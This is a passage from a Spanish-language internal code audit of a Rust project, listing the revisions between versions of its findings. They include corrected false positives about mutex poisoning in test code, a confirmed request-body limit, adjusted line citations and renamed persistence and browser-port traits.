  74 `lock().expect/unwrap` de `core/src` TODOS bajo `#[cfg(test)]` + producción con
  `unwrap_or_else(poison→into_inner)` → K14 reescrito.
- Marcas [S] restantes: S1/S2/S6–S15 (salvo S3–S5), R4/R6/R7/R9–R12, K2/K5–K10/K15,
  resto de §4. Líneas orientativas (drift posible por 139A-1…139A-7). El plan 139A-8
  exige F0 de re-resolución con grep antes de codificar cada fase.

### Revisión v1 → v2 (13-09, tras verificación directa)

1. **K12 reescrito (MEDIA, matiz):** el límite de cuerpo SÍ existe
   (`RequestBodyLimitLayer`, `web/mod.rs:542`). Queda solo rate-limit + tope
   concurrente. Causa: la pasada no buscó `tower_http`.
2. **K14 invalidado y reescrito (BAJA, falso positivo propio):** las citas eran dobles
   de test; producción ya tolera envenenado. Causa: la pasada no cruzó con `#[cfg(test)]`.
3. **S5 corregido:** 9 métodos, no 10 (conteo directo de `ports.rs:583-599`).
4. **`context.rs:971` → `:972`** (lectura directa); `permisos.rs:190` confirmado
   (palabra "pendiente" en doc-comentario).
5. **G1 precisado** (3 awaits + 2 sqlite bloqueantes, líneas exactas); **R3 con
   restricción** (`>=` por segundos); **K4 matizado** (exec directo, no shell);
   **G6 matizado** (sink sanitizado; gap = productor); **R5 confirmado** (`unwrap_or`);
   **`scheduler.rs:66` acotado** (lote de 5).
6. Lección para el plan: toda cita [S] se re-verifica en F0; el gate no distingue
   test/prod en reglas futuras (`ignorar #[cfg(test)]` explícito en §4.4).
7. F0-F4 (139A-8, 13-09): S1–S5 vigentes sin cambios (ver detalle en el plan F4).
   Lo que cayó fue la paráfrasis del plan v1–v4, no las citas: S3 se corrige a los
   nombres de esta auditoría (`PersistenciaTurnos`/`PersistenciaMemoria`/
   `PersistenciaSkills`/`ColaTareas` + compuesto; `Conversaciones`/`Mensajes`/.../
   `Mem0Store` son stores del consumidor externo, no de este repo); S4 a
   `SoportaSkills`/`SoportaAmbitos` (`cdp(URL)` y `attach_shell_por_defecto` del
   plan no existen en el código: `cdp(metodo, parametros)` en `ports.rs:591`);
   S5 a `NavegadorBase`+`Capturable`+`Scriptable`+`Automatizable`. Observación sin
   fix (fuera de S5): el adaptador desktop ignora el selector de `snapshot`
   (`desktop/src-tauri/src/navegador/puerto.rs:99-102`).
